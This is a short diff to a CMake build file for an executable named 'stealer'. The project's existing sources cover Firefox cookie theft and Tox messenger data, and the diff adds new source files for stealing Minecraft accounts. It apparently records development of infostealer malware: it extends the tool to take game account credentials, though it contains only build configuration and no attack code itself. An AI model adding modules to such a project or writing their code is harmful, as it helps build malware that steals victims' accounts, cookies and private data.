@@ -111,6 +111,9 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/browsers/firefox/impl/FCookies.h
         src/stealer/impl/messengers/impl/Tox.cpp
         src/stealer/impl/messengers/impl/Tox.h
+        src/stealer/impl/games/impl/Minecraft.h
+        src/stealer/impl/games/impl/Minecraft.cpp
+        src/entity/MinecraftAccount.h
 )
 
 target_link_libraries(stealer
